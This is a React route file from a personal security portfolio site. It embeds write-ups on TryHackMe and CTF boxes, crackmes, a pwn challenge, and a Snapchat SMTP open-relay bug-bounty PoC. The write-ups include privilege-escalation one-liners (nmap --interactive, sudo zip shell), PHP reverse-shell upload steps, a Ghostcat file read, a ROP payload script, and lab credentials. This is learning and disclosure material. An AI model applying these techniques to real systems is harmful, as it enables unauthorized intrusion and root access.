import { createFileRoute, Link, notFound, redirect } from "@tanstack/react-router";
import { Reveal } from "@/components/Reveal";
import { ArrowLeft, Calendar, Tag } from "lucide-react";

type Post = {
  slug: string;
  title: string;
  date: string;
  tags: string[];
  body: string;
};

const PDF_MAP: Record<string, string> = {
  "0xl0ccedc0de-revenge":       "/writeups/Write-Up 0xL0CCEDC0DE'S REVENGE.pdf",
  "tryhackme-tomcat-ghostcat":  "/writeups/TryHackMe Tomcat (Ghostcat).pdf",
  "mr-robot-ctf":               "/writeups/Mr Robot CTF Final.pdf",
  "jack-of-all-trades":         "/writeups/CTF Walkthrough_ Jack-of-All-Trades.pdf",
  "chainbreaker-re":            "/writeups/Chainbreaker (RE) Write-Up.pdf",
  "crowdsecurity-auth":         "/writeups/CrowdSecurity Auth – Full Write-up.pdf",
  "ascii-crackme":              "/writeups/Writeup — ascii.pdf",
  "cybertalents-practice-bash": "/writeups/CyberTalents _Practice Bash_ Challenge Write-Up.pdf",
};

const POSTS: Record<string, Post> = {
  "snapchat-smtp-open-relay": {
    slug: "snapchat-smtp-open-relay",
    title: "Snapchat SMTP Open Relay Vulnerability",
    date: "2025-05-15",
    tags: ["smtp", "bug bounty", "email security", "reconnaissance"],
    body: `During a bug bounty engagement, I discovered an SMTP open relay vulnerability on beta.snappublisher.snapchat.com. This allowed unauthenticated users to send email through Snapchat's infrastructure.

## Proof-of-Concept

\`\`\`
telnet beta.snappublisher.snapchat.com 25
220 beta.snappublisher.snapchat.com ESMTP
HELO attacker.com
250 beta.snappublisher.snapchat.com
MAIL FROM:<test@external.com>
250 OK
RCPT TO:<recipient@gmail.com>
250 OK
DATA
354 End data with <CR><LF>.<CR><LF>
Subject: Test Message

This is a test message.
.
250 OK
\`\`\`

The server successfully relayed the message, confirming the vulnerability. I reported this to Snapchat with a video PoC and recommended restricting SMTP relay to authenticated users only.

## Impact

This vulnerability could be abused for phishing or large-scale spam campaigns, posing a significant risk to brand reputation and user trust.

## Recon Tools Used

Subfinder, httpx, swaks.

## Key Takeaway

A full bug bounty workflow — from reconnaissance and exploitation to responsible disclosure and reporting.`,
  },
  "tryhackme-three-season-streak": {
    slug: "tryhackme-three-season-streak",
    title: "TryHackMe Leaderboards: 1st Place Across Three Seasons",
    date: "2025-09-01",
    tags: ["tryhackme", "red team", "achievements"],
    body: `Achieved 1st place globally on TryHackMe leaderboards across three competitive seasons, demonstrating consistency, discipline, and advanced offensive security capabilities.

## Achievements

- **Bronze League** — 1st Place (rarity 5.2%)
- **Gold League** — 1st Place (rarity 1.7%)
- **Sapphire League** — 1st Place (rarity 0.8%, Epic Tier)

These rankings reflect sustained hands-on practice in real-world attack simulations, including enumeration, exploitation, privilege escalation, and post-exploitation across diverse lab environments.

## Focus Areas

- Web and Network Exploitation
- Privilege Escalation
- Active Directory Labs
- Red Team Methodology

## Takeaway

Consistency outweighs short-term effort. Structured learning, daily practice, and an offensive mindset are the key drivers of top-tier performance on competitive security platforms.`,
  },
  "journey-into-red-teaming": {
    slug: "journey-into-red-teaming",
    title: "My Journey into Red Teaming",
    date: "2025-05-20",
    tags: ["red teaming", "learning", "engineering"],
    body: `My journey into red teaming has been both demanding and rewarding while pursuing a degree in Communications and Electronics Engineering. Balancing an intensive academic workload with hands-on cybersecurity practice has shaped my learning approach and time management skills.

Unlike traditional penetration testing, red teaming focuses on emulating real-world adversaries to evaluate an organization's overall security posture. My interest in this field grew naturally from my engineering background, where low-level system understanding is essential.

## Key Challenges

- Balancing engineering coursework with cybersecurity learning
- Frequent context switching between theory-heavy subjects and practical labs
- Limited time requiring depth-focused learning strategies
- Self-directed study due to the absence of red teaming in academic curricula

## Validation Through Competition

- **CyberTalents** — Ranked 20th out of 250 participants
- **CyShield** — Top 100 placement

These experiences strengthened my analytical thinking, persistence, and ability to learn complex systems efficiently.

## Looking Ahead

I'm actively preparing for future competitions and challenges, including upcoming CyberTalents editions, Zinad cybersecurity competitions, and advanced red team simulation labs currently in progress.

Each milestone reinforces my commitment to mastering offensive security through strong engineering fundamentals and continuous learning.`,
  },
  "chainbreaker-re": {
    slug: "chainbreaker-re",
    title: "Chainbreaker (RE) — Iterative State Cracking",
    date: "2025-10-20",
    tags: ["reverse engineering", "ghidra", "crackme", "ctf"],
    body: `The binary takes a single integer SEED, computes a number of iterations N = required_links(seed), then repeatedly applies parse(seed, state, i) for N steps. It only succeeds if the final state is exactly the original seed.

## Recon

Without exactly one argument it prints "usage: ./chainbreaker SEED" and exits. Otherwise main() reads argv[1] as a decimal integer, derives N from a small arithmetic expression on the seed, then runs a feedback loop where each iteration sleeps for max(state, 0) milliseconds.

## Renaming in Ghidra

Renaming variables makes the decompile readable: param_1 → argc, param_2 → argv, local_2c → seed, local_1c → chain_state, local_20 → required_links, local_24 → step_idx. Inside parse(): param_2 → current_state, param_3 → step_idx, local_20 → state_mod, local_c → xor_mix.

## The math

required_links(seed) is computed as:

\`\`\`c
req = (int)(((seed ^ 0x141) + (seed ^ 0x7b)) * 0x533d) % 100;
if (req < 0) req = -req;
else if (req == 0) req = 10;
\`\`\`

So N is bounded to 1..99 — small enough to brute-force.

parse() normalizes current_state into a window, builds a small mixing term xor_mix = 1 ^ s ^ (s<<1) ^ (s<<2), then returns:

\`\`\`c
next = seed + (((step_idx + seed) - 1) ^ state_mod) + xor_mix - 0x0F;
\`\`\`

## Solver strategy

For each candidate seed in a range: compute N like the C code, simulate parse_step N times, check if final state == seed. Done. The trick is matching C's signed/unsigned arithmetic exactly — int32 wrap, uint32 cast, and C-style remainder for negatives.

## Result

Brute-forcing the range -20000..20000 found seed = -11478 with 72 links. Running ./chainbreaker -11478 prints all 72 transitions and ends with "You have broken the chain!".

## Lessons

- Always rename Ghidra variables before reasoning about logic.
- Reproduce C integer semantics carefully when porting to Python.
- A small modulo (% 100) is a giant hint that brute-force is intended.`,
  },
  "crowdsecurity-auth": {
    slug: "crowdsecurity-auth",
    title: "CrowdSecurity Auth — Algebraic Reversal",
    date: "2025-10-12",
    tags: ["reverse engineering", "radare2", "ghidra"],
    body: `An ELF 64-bit auth crackme. The binary asks for a username and a password, then validates the password against the username using a custom per-character formula. Target username: CrowdSecurity.

## Recon

radare2 with -A and \`iz\` revealed the prompts, "Good Job", and "Access denied!!" strings. \`afl ~main\` pointed at main at 0x130b.

## Decompiled logic

The wrapper allocates two 0x32 (50-byte) buffers via malloc, scanf("%s", ...) twice, then calls FUN_001011e9 — the verifier.

The verifier holds a hardcoded table of 13 ints (0x74, 0x143, 0x21b, 0x334, 0x3a1, 0x456, 0x50b, 0x63c, 0x719, 0x889, 0x915, 0x76b, 0x85c) and loops:

\`\`\`c
if (((u + p) * (i + 1) - u) + i != L[i]) return 0;
\`\`\`

## Reversing the equation

Each character is independent — a major weakness. Solving for p:

((u + p) * (i + 1) - u) + i = L
(u + p) * (i + 1) = L - i + u
u + p = (L - i + u) / (i + 1)
p = ((L - i + u) / (i + 1)) - u

## Solver

A 10-line Python script iterates the 13 indices, computes p_ascii = ((L - i + u) // (i + 1)) - u, and prints the password character by character.

## Result

Username: CrowdSecurity
Password: thisisapass34

## Takeaway

Custom validation routines without inter-character coupling collapse to N independent linear equations. If you can write the formula on paper, you can solve the password without ever running John or hashcat.`,
  },
  "jack-of-all-trades": {
    slug: "jack-of-all-trades",
    title: "Jack-of-All-Trades — Ports, Stego, and SUID Strings",
    date: "2025-09-22",
    tags: ["ctf", "tryhackme", "stego", "ssh", "suid"],
    body: `A TryHackMe box that swaps service ports and hides credentials in image steganography.

## Recon

\`nmap -sV -sC -v -T4 10.10.139.170\` showed two oddities: HTTP on 22 and OpenSSH 6.7p1 on 80 — ports deliberately swapped.

## Web layer

Browsing port 22 revealed a page with hints and multiple images. Page source had a base64 string decoding to "Remember to use a password manager!" — a rabbit hole. The real lead: three images (stego1.jpg, stego2.jpg, stego3.jpg).

## Steganography

\`steghide extract -sf stego1.jpg\` with empty passphrase returned creds.txt: jack / processingprincess.

## SSH

\`ssh jack@10.10.139.170 -p 80\` — logged in as jack.

## Privilege Escalation

\`find / -perm -4000 2>/dev/null\` showed /usr/bin/strings is SUID root. Running \`strings /etc/shadow\` leaked the root hash. Cracked with john: root / gotta love the cats.

## Flags

- user.txt: found in /home/jack
- root.txt: \`su root\` then cat /root/root.txt`,
  },
  "ascii-crackme": {
    slug: "ascii-crackme",
    title: "ascii — Position-Shift Crackme",
    date: "2025-09-30",
    tags: ["reverse engineering", "ghidra", "crackme"],
    body: `A small reverse engineering crackme: the binary doesn't compare your input directly — it encodes it first, then compares against a hidden global string.

## main()

Expects exactly one argv. For each character it calls encode(*pcVar3, '\\x06' - i) and appends the result to an output string, then passes that to verify(). On match: "You cracked me!".

## encode()

\`\`\`c
char encode(char c, char k) { return c + k; }
\`\`\`

So per index i: encoded[i] = input[i] + (6 - i). The shift sequence: +6, +5, +4, +3, +2, +1, +0, -1, -2, -3...

## verify()

Decompiled to a thin std::operator== wrapper. The assembly showed:

\`\`\`
LEA RDX,[encoded_flag]
CALL std::operator==
\`\`\`

So the comparison target is a global C++ string named encoded_flag, initially zero in .bss — meaning it's filled during static initialization.

## Recovering the target

Following _GLOBAL__sub_I_encoded_flag → __static_initialization_and_destruction_0 led to:

\`\`\`
std::__cxx11::string::string(encoded_flag, "IYJ~U4cQ1Q[<mL[(U;\`'Ynk/M-i", &local_29);
\`\`\`

## Inverting the transform

input[i] = encoded[i] - (6 - i)

Applied to "IYJ~U4cQ1Q[<mL[(U;\`'Ynk/M-i" yields:

CTF{S3cR3T_AsSc1_Fl4g}{@_@}

## Verification

\`./ascii 'CTF{S3cR3T_AsSc1_Fl4g}{@_@}'\` → "You cracked me!".

## Lessons

When verify() looks empty, follow the assembly to find the comparison target. Globals initialized as C++ string objects live in .bss but get populated by per-translation-unit initializer functions — chase those to recover the bytes.`,
  },
  "0xl0ccedc0de-revenge": {
    slug: "0xl0ccedc0de-revenge",
    title: "0xL0CCEDC0DE'S REVENGE — Multi-Stage Pwn",
    date: "2025-11-02",
    tags: ["binary exploitation", "format string", "rop", "ret2func"],
    body: `A multi-stage pwn challenge requiring format-string exploitation, integer boundary bypass, heap overflow, and a ret2func ROP chain.

## Stage0 — format string %hhn flip

The binary prints user input via printf(buf) — classic format string. The goal: flip a single byte from 0x00 to 0x01. Using %hhn with a crafted address write. Prepending "A" makes printed_chars = 1 so %hhn writes 0x01 instead of 0x00.

## Stage1 — integer trap

The check is: state >= 0x1001 → "not allowed", state < 0x1000 → "not enough power". Only valid value: 0x1000 = 4096.

## Stage2 — heap overflow

scanf("%s", pcVar3) into a fixed strdup buffer. The next strdup ("0xL0CCED") sits adjacent. Cyclic of 40 chars showed offset 32 to overwrite the second buffer. Required value: "0P3N".

Payload: 32 bytes of padding + "0P3N".

## Stage3 — stack overflow + ret2func

gets() into a 10-byte buffer; offset to RIP = 18. Helpful functions exist:

stage3_solver0 at 0x4014c8 — calls malloc(0x64), stores in [msg], sets RDI=msg, RSI="PLEASE OPEN!"
stage3_solver1 at 0x4014f8 — strcpy(msg, open) then strcmp

Crucially solver0 sets up solver1's arguments. So the chain is just: padding + ret + solver0 + ret + solver1.

## Final exploit

\`\`\`python
from struct import pack
OFFSET = 18
RET    = 0x40101a
SOLVER0= 0x4014c8
SOLVER1= 0x4014f8
payload  = b"A" * OFFSET
payload += pack("<Q", RET) + pack("<Q", SOLVER0)
payload += pack("<Q", RET) + pack("<Q", SOLVER1)
\`\`\`

## Lessons

- Bash printf mangles %hhn — use Python or echo carefully.
- ret2func chains break stack alignment — keep a ret gadget handy.
- Function epilogues with pop rbp eat your dummy values.`,
  },
  "mr-robot-ctf": {
    slug: "mr-robot-ctf",
    title: "Mr Robot CTF — WordPress to Root via SUID nmap",
    date: "2025-08-14",
    tags: ["wordpress", "wpscan", "privesc", "suid"],
    body: `A TryHackMe box themed around the Mr Robot TV show. Three hidden flags across a WordPress installation.

## Recon

nmap revealed ports 80 (HTTP) and 443 (HTTPS). The site runs WordPress. robots.txt exposed key-1-of-3.txt and fsocity.dic — a wordlist.

## Key 1

Directly accessible at /key-1-of-3.txt.

## Key 2 — WordPress brute-force

WPScan enumerated the user "elliot". Brute-forced the password using fsocity.dic (deduplicated first with sort -u). Logged into wp-admin as elliot.

Uploaded a PHP reverse shell via Appearance → Theme Editor → 404.php. Triggered it by visiting a non-existent page. Got a shell as daemon.

Found /home/robot/key-2-of-3.txt — readable only by robot. Also found password.raw-md5. Cracked with CrackStation: abcdefghijklmnopqrstuvwxyz. Switched to robot with su robot.

## Key 3 — SUID nmap

\`find / -perm -4000 2>/dev/null\` found /usr/local/bin/nmap with SUID root. Old nmap versions have interactive mode:

\`\`\`
nmap --interactive
!sh
\`\`\`

Got root shell. Read /root/key-3-of-3.txt.

## Lessons

- Always deduplicate wordlists before brute-forcing — saves hours.
- Theme editors in CMS platforms are a classic foothold vector.
- SUID on interpreter-like binaries (nmap, vim, python) means instant root.`,
  },
  "tryhackme-tomcat-ghostcat": {
    slug: "tryhackme-tomcat-ghostcat",
    title: "TryHackMe Tomcat — Ghostcat (CVE-2020-1938)",
    date: "2025-08-29",
    tags: ["ghostcat", "cve-2020-1938", "tomcat", "gpg"],
    body: `Exploiting Apache Tomcat's AJP connector to read arbitrary files, extract SSH credentials, and escalate to root via sudo zip and a cron-executed script.

## Recon

nmap found port 8009 (AJP) open alongside 8080 (HTTP). AJP on 8009 is the Ghostcat fingerprint.

## Ghostcat exploitation

Used the PoC for CVE-2020-1938 to read /WEB-INF/web.xml via the AJP connector. The file contained credentials: skyfuck / 8730281lkjlkjdqlksalks.

## SSH access

\`ssh skyfuck@target\` — logged in. Found two files: credential.pgp and tryhackme.asc.

## GPG decryption

Imported the key: \`gpg --import tryhackme.asc\`. The key was passphrase-protected. Extracted the hash with gpg2john and cracked with john: alexandru.

Decrypted: \`gpg --decrypt credential.pgp\` → merlin / asuyusdoiuqoilkda312j31k2j123j.

## Privilege escalation

Switched to merlin. \`sudo -l\` showed: (root) NOPASSWD: /usr/bin/zip.

GTFOBins zip privesc:
\`\`\`
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
\`\`\`
Got root shell.

## Lessons

- AJP port 8009 exposed publicly is an immediate Ghostcat indicator.
- GPG-encrypted files with exported keys are always worth cracking.
- GTFOBins covers sudo zip — always check sudo -l first.`,
  },
  "cybertalents-practice-bash": {
    slug: "cybertalents-practice-bash",
    title: "CyberTalents — Practice Bash Walkthrough",
    date: "2025-10-17",
    tags: ["bash", "stego", "zip cracking", "cybertalents"],
    body: `A multi-layer challenge involving nested zip archives, steganography, and base64-chained passwords.

## Initial recon

The challenge provided a zip file. Extracting revealed another zip, password-protected. Standard tools: fcrackzip, john with zip2john, hashcat — all attempted.

## The ELF clue

Inside one of the archives was an ELF binary. Running \`strings\` on it revealed: passforasciiii — the password for the next archive.

## Nested extraction chain

Each archive contained either another archive or a base64-encoded string. Decoding each base64 blob gave the password for the next level. Chain ran approximately 6 levels deep.

## Final flag

The last archive contained a text file with the flag after base64 decoding the final blob.

## Lessons

- Always run strings on unknown binaries before trying to execute them.
- Nested archives are a common CTF pattern — script the extraction loop.
- base64 -d is your best friend in bash-heavy challenges.`,
  },
};

export const Route = createFileRoute("/writeups/$slug")({
  loader: ({ params }) => {
    if (PDF_MAP[params.slug]) {
      throw redirect({ href: encodeURI(PDF_MAP[params.slug]) });
    }
    const post = POSTS[params.slug];
    if (!post) throw notFound();
    return { post };
  },
  head: ({ loaderData }) => ({
    meta: loaderData
      ? [
          { title: `${loaderData.post.title} — Writeups — Mostafa Galal` },
          { name: "description", content: loaderData.post.body.slice(0, 160) },
          { property: "og:title", content: `${loaderData.post.title} — Mostafa Galal` },
          { property: "og:description", content: loaderData.post.body.slice(0, 160) },
        ]
      : [{ title: "Writeup — Mostafa Galal" }],
  }),
  notFoundComponent: () => (
    <div className="mx-auto max-w-3xl px-4 py-32 text-center sm:px-6">
      <div className="font-mono text-xs uppercase tracking-[0.25em] text-cyber-cyan">
        err::404
      </div>
      <h1 className="mt-4 font-display text-4xl font-bold">Writeup not found</h1>
      <Link
        to="/writeups"
        className="mt-6 inline-flex items-center gap-2 rounded-full px-4 py-2 font-mono text-xs uppercase tracking-wider text-cyber-cyan glass-panel gradient-border"
      >
        <ArrowLeft className="h-3.5 w-3.5" /> back to writeups
      </Link>
    </div>
  ),
  component: WriteupDetail,
});

function WriteupDetail() {
  const { post } = Route.useLoaderData();

  return (
    <article className="mx-auto max-w-3xl px-4 py-16 sm:px-6">
      <Reveal>
        <Link
          to="/writeups"
          className="inline-flex items-center gap-2 font-mono text-xs uppercase tracking-wider text-cyber-cyan"
        >
          <ArrowLeft className="h-3.5 w-3.5" /> back to writeups
        </Link>
      </Reveal>

      <Reveal delay={0.1}>
        <div className="mt-8 flex flex-wrap items-center gap-4 font-mono text-[10px] uppercase tracking-wider text-muted-foreground">
          <span className="inline-flex items-center gap-1">
            <Calendar className="h-3 w-3" /> {post.date}
          </span>
          <span className="inline-flex items-center gap-1 text-cyber-cyan">
            <Tag className="h-3 w-3" /> {post.tags.join(" / ")}
          </span>
        </div>
        <h1 className="mt-3 font-display text-4xl font-bold leading-tight sm:text-5xl">
          {post.title}
        </h1>
      </Reveal>

      <Reveal delay={0.15}>
        <div className="prose prose-invert mt-10 max-w-none space-y-5 text-foreground/85">
          {post.body.split("\n\n").map((block: string, i: number) => {
            if (block.startsWith("## ")) {
              return (
                <h2
                  key={i}
                  className="mt-8 font-display text-2xl font-semibold text-foreground"
                >
                  {block.replace(/^##\s/, "")}
                </h2>
              );
            }
            if (block.startsWith("```")) {
              const code = block.replace(/^```[a-z]*\n?/, "").replace(/```$/, "");
              return (
                <pre
                  key={i}
                  className="overflow-x-auto rounded-xl p-4 font-mono text-xs glass-panel gradient-border"
                >
                  <code>{code}</code>
                </pre>
              );
            }
            if (block.startsWith("- ")) {
              return (
                <ul key={i} className="ml-5 list-disc space-y-1.5">
                  {block.split("\n").map((li: string, j: number) => (
                    <li key={j}>{li.replace(/^-\s/, "")}</li>
                  ))}
                </ul>
              );
            }
            return (
              <p key={i} className="leading-relaxed">
                {block}
              </p>
            );
          })}
        </div>
      </Reveal>
    </article>
  );
}
